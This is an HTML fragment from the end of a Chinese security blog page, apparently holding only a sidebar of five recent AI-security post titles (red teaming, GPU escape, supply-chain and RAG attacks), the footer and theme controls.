card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/10/13/AI%E7%BA%A2%E9%98%9F%E4%B8%8D%E6%98%AF%E4%BC%A0%E7%BB%9F%E6%B8%97%E9%80%8F-%E5%AE%89%E5%85%A8%E4%BA%BA%E5%BF%85%E9%A1%BB%E5%85%88%E9%87%8D%E5%BB%BA%E7%9A%846%E4%B8%AA%E8%AE%A4%E7%9F%A5/" title="AI 红队不是传统渗透：安全人必须先重建的 6 个认知"><img src="/img/avatar-oss.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AI 红队不是传统渗透：安全人必须先重建的 6 个认知"/></a><div class="content"><a class="title" href="/2026/10/13/AI%E7%BA%A2%E9%98%9F%E4%B8%8D%E6%98%AF%E4%BC%A0%E7%BB%9F%E6%B8%97%E9%80%8F-%E5%AE%89%E5%85%A8%E4%BA%BA%E5%BF%85%E9%A1%BB%E5%85%88%E9%87%8D%E5%BB%BA%E7%9A%846%E4%B8%AA%E8%AE%A4%E7%9F%A5/" title="AI 红队不是传统渗透：安全人必须先重建的 6 个认知">AI 红队不是传统渗透：安全人必须先重建的 6 个认知</a><time datetime="2026-10-12T16:00:00.000Z" title="发表于 2026-10-13 00:00:00">2026-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/07/AI%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8-%E4%BA%91-%E5%AE%B9%E5%99%A8%E4%B8%8EGPU%E9%80%83%E9%80%B8/" title="AI基础设施安全：云、容器与GPU逃逸"><img src="/img/avatar-oss-2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AI基础设施安全：云、容器与GPU逃逸"/></a><div class="content"><a class="title" href="/2026/10/07/AI%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8-%E4%BA%91-%E5%AE%B9%E5%99%A8%E4%B8%8EGPU%E9%80%83%E9%80%B8/" title="AI基础设施安全：云、容器与GPU逃逸">AI基础设施安全：云、容器与GPU逃逸</a><time datetime="2026-10-06T16:00:00.000Z" title="发表于 2026-10-07 00:00:00">2026-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/04/AI%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB-%E4%BB%8E%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6%E5%88%B0%E4%BE%9D%E8%B5%96%E5%8C%85%E7%9A%84%E4%BF%A1%E4%BB%BB%E5%8D%B1%E6%9C%BA/" title="AI供应链攻击：从模型文件到依赖包的信任危机"><img src="/img/avatar-oss.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AI供应链攻击：从模型文件到依赖包的信任危机"/></a><div class="content"><a class="title" href="/2026/10/04/AI%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB-%E4%BB%8E%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6%E5%88%B0%E4%BE%9D%E8%B5%96%E5%8C%85%E7%9A%84%E4%BF%A1%E4%BB%BB%E5%8D%B1%E6%9C%BA/" title="AI供应链攻击：从模型文件到依赖包的信任危机">AI供应链攻击：从模型文件到依赖包的信任危机</a><time datetime="2026-10-03T16:00:00.000Z" title="发表于 2026-10-04 00:00:00">2026-10-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/03/%E5%B5%8C%E5%85%A5%E5%90%91%E9%87%8F%E6%94%BB%E5%87%BB-%E4%BB%8E%E5%90%91%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8D%E6%8E%A8%E5%8E%9F%E6%96%87/" title="嵌入向量攻击：从向量数据库反推原文"><img src="/img/avatar-oss-2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="嵌入向量攻击：从向量数据库反推原文"/></a><div class="content"><a class="title" href="/2026/10/03/%E5%B5%8C%E5%85%A5%E5%90%91%E9%87%8F%E6%94%BB%E5%87%BB-%E4%BB%8E%E5%90%91%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8D%E6%8E%A8%E5%8E%9F%E6%96%87/" title="嵌入向量攻击：从向量数据库反推原文">嵌入向量攻击：从向量数据库反推原文</a><time datetime="2026-10-02T16:00:00.000Z" title="发表于 2026-10-03 00:00:00">2026-10-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/09/30/RAG%E6%94%BB%E5%87%BB%E9%9D%A2-%E4%BD%A0%E7%9A%84%E7%9F%A5%E8%AF%86%E5%BA%93%E6%98%AF%E5%AE%89%E5%85%A8%E7%9A%84%E5%90%97/" title="RAG攻击面：你的知识库是安全的吗"><img src="/img/avatar-oss.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RAG攻击面：你的知识库是安全的吗"/></a><div class="content"><a class="title" href="/2026/09/30/RAG%E6%94%BB%E5%87%BB%E9%9D%A2-%E4%BD%A0%E7%9A%84%E7%9F%A5%E8%AF%86%E5%BA%93%E6%98%AF%E5%AE%89%E5%85%A8%E7%9A%84%E5%90%97/" title="RAG攻击面：你的知识库是安全的吗">RAG攻击面：你的知识库是安全的吗</a><time datetime="2026-09-29T16:00:00.000Z" title="发表于 2026-09-30 00:00:00">2026-09-30</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Cr4at0r</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
